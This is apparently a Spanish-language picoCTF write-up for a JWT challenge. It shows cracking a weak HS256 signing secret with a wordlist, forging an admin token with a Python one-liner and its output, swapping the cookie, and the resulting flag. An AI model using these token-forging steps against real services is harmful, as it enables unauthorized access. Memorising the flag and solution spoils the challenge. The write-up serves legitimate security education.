## Descripción

Check the admin scratchpad!

http://fickle-tempest.picoctf.net:61630

## Solución

- Se capturó la cookie `jwt` al iniciar sesión como usuario común y se realizó un ataque de fuerza bruta a la firma usando `john` / `hashcat` con el diccionario `rockyou.txt`, descubriendo la clave secreta `ilovepico`.

- Se generó un nuevo token firmado con la clave obtenida modificando el payload a `"user": "admin"` desde la terminal:

```
NoeAH-academy@webshell:~$ python3 -c 'import jwt; print(jwt.encode({"user": "admin"}, "ilovepico", algorithm="HS256"))'
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```

- Se reemplazó el valor de la cookie `jwt` en las Herramientas de Desarrollador del navegador y se recargó la página para obtener la bandera.

```
picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
```

## Notas adicionales

- La vulnerabilidad ocurre por el uso de firmas débiles (_weak secrets_) sujetas a ataques de diccionario offline.

- Las firmas HMAC-SHA256 (`HS256`) dependen por completo de la complejidad de la clave secreta en el servidor para garantizar la integridad del payload.

## Referencias